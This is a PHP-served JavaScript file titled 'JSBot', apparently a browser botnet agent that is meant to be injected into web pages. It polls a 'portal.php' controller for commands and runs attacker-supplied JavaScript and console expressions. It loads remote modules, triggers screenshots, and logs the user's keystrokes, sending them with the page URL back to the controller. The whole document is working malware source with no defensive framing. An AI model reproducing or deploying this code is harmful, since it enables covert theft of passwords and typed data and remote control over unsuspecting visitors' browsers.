<?php
header('Content-Type: application/javascript');
function out($js) {
  $js = (explode('<script>', $js))[1];
  $js = str_replace("\n", '', $js);
  $js = str_replace('  ', ' ', $js);
  $js = str_replace('  ', ' ', $js);
  return $js;
}
ob_start("out");
?>
/*
 * JSBot
 * By: Andrew Blalock (https://github.com/derp-all-day)
 */
//<script>
let jsr = {
  host_url: "<?=$_GET['proto'].'://'.$_SERVER['HTTP_HOST'].str_replace('/js/listener.php', '', $_SERVER['PHP_SELF'])?>",
  recv: null,
  cnct: null,
  loc: "",
  presses: "",
  jsr: (function() {
    document.addEventListener('visibilitychange', jsr.vis);
  }),
  vis: (function(){
    if(document.hidden || document.msHidden || document.webkitHidden) {
      jsr.stop();
    } else {
      jsr.start();
    }
  }),
  start: (function(){
    console.log("[SESSION START]");
    jsr.hello();
    jsr.getcmd();
    jsr.recv = setInterval(jsr.getcmd, 30000);
    jsr.cnct = setInterval(jsr.hello, 60000);
    jsr.pageChange();
  }),
  stop: (function(){
    clearInterval(jsr.recv);
    clearInterval(jsr.cnct);
    console.log("[SESSION STOP]");
  }),
  getcmd: (function(){
    jsr.ajaxReq(jsr.host_url + "/portal.php?recv="+Math.floor((Math.random()*99999999)+1),function(x){
      var data = JSON.parse(x);
      if(data.command == "customjs") {
        jsr.callScript( data.argument1 );
      } else if (data.command == "close") {
          window.removeEventListener("visibilitychange", jsr.vis);
          jsr.stop();
          clearInterval(jsr.cnct);
      } else if (data.command == "stopkeylog") {
        window.removeEventListener("keydown", jsr.sendLog);
        jsr.cleanup();
      } else if (data.command == "keylog") {
        window.addEventListener("keydown", jsr.sendLog);
      } else if (data.command == "console") {
        jsr.ajaxReq(jsr.host_url + "/portal.php?post=console", function(c){}, "POST", { log: btoa((new Function("return " + data.argument1)())), cmd: data.argument1 });
      } else if(data.command == "screenshot") {
        jsr.callScript(jsr.host_url + "/js/screenshot.php");
      } else if(data.command == "load_mod") {
        jsr.callScript( data.argument1, true );
      } else if(data.command == "unload_mod") {
        if(typeof data.argument2 == "string") {
          window[data.argument2]();
        }
        document.getElementById("jsr_mod_" + data.argument1).remove();
      }
    }, "GET" );
  }),
  stopScreenshareEVNT: (function(){
    document.removeEventListener('scroll', jsr.ssScroll());
    var evnt = ['click', 'keydown'];
    for(var key in evnt) {
      document.removeEventListener(evnt[key], jsr.screenshare());
    }
  }),
  screenshareEVNT: (function(){
    document.addEventListener('scroll', jsr.ssScroll());
    var evnt = ['click', 'keydown'];
    for(var key in evnt) {
      document.addEventListener(evnt[key], jsr.screenshare());
    }
  }),
  screenshare: (function(){

  }),
  ssScroll: (function(){

  }),
  hello: (function(){
    jsr.ajaxReq(jsr.host_url + "/portal.php?post=hello&cb=" + Math.floor((Math.random() * 99999999) + 1), function(x){
      var data = JSON.parse(x);
      if(data.log == "true") {
        window.addEventListener("keydown", jsr.sendLog);
      } else {
        window.removeEventListener("keydown", jsr.sendLog);
        jsr.cleanup();
      }
    }, "POST", {ref: window.location.href});
  }),
  sendLog: (function(x){
    jsr.presses = jsr.presses + jsr.filterKey(x.key);
    if(jsr.loc == "") {
      jsr.loc = window.location.href;
      jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses, ref: window.location.href });
      jsr.presses = "";
    } else if(jsr.presses.length>15) {
      jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses });
      jsr.presses = "";
    }
  }),
  cleanup: (function(){
    if(jsr.presses != "") {
      jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses, flush: "true" });
      jsr.presses = "";
    }
  }),
  pageChange: (function(){
    document.addEventListener('click', function (event) {
      jsr.cleanup();
    });
    window.addEventListener('onbeforeunload', function(e) {
      jsr.cleanup();
      alert("Are you sure you would like to leave this page?");
    });
  }),
  filterKey: (function(x){
    var keymap = {
      "Backspace":"{BS}","ArrowUp":"{AU}","ArrowDown":"{AD}","ArrowLeft":"{AL}","Alt":"{ALT}","ArrowRight":"{AR}",
      "Shift":"{SHFT}","Control":"{CTRL}","Escape":"{ESC}","Tab":"{TAB}","Enter":"{ENTR}","CapsLock":"{CL}"
    };
    return keymap[x] || x;
  }),
  callScript: (function( url, mod = false ) {
    var script=document.createElement("script");
    script.setAttribute("type","text/javascript");
    if(mod) {
      script.setAttribute("src", jsr.host_url + "/modules/" + url + ".module.js");
      script.setAttribute("id", "jsr_mod_" + url);
    } else {
      script.setAttribute("src", url);
    }
    var head = document.getElementsByTagName("head")[0];
    head.appendChild(script);
  }),
  ajaxReq: (function( url,callback,method="GET",data=""){
    method = ({"GET":"GET","POST":"POST"})[method.toUpperCase()] || "GET";
    var xhr = new XMLHttpRequest();
    xhr.open(method, url);
    if(method == "POST"){
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    }
    xhr.onload = function() {if (xhr.status === 200) {
        callback(xhr.responseText);
      }
    };
    if(method == "POST") {
      var query = "";
      for (var key in data) {
        query += encodeURIComponent(key)+"="+encodeURIComponent(data[key])+"&";
      }
      xhr.send((query.substring(0, query.length - 1)));
    } else {
      xhr.send();
    }
  }),
};
jsr.jsr();
jsr.start();
